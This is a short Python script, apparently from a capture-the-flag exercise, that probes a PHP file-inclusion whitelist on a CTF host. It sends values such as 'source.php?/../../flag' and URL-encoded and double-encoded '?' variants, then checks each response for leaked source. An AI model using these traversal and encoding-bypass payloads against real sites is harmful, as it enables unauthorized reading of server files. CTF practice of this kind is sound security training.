# -*- coding: utf-8 -*-
"""二分定位：? 截断是否生效"""
import requests

base = 'http://29f3b8fe57ff6823861b7021.http-ctf2.dasctf.com:80'

tests = [
    ('source.php',              '白名单直过(基准)'),
    ('source.php?',             '?后空'),
    ('source.php?a',            '?后1字符'),
    ('source.php?abc',          '?后短串'),
    ('source.php?/../../flag',  '?后路径'),
    ('source.php%3f/flag',      '%3f 编码'),
    ('source.php%3F/flag',      '%3F 大写'),
    ('source.php%253f/flag',    '双编码'),
]

for v, label in tests:
    r = requests.post(base + '/', data={'file': v}, timeout=10)
    L = len(r.text)
    status = '✅ include成功(源码)' if 'checkFile' in r.text else ('❌ 失败页' if L < 500 else f'⚠️ 其他({L})')
    print(f'{label:<16} {v[:30]:<32} len={L:<6} {status}')
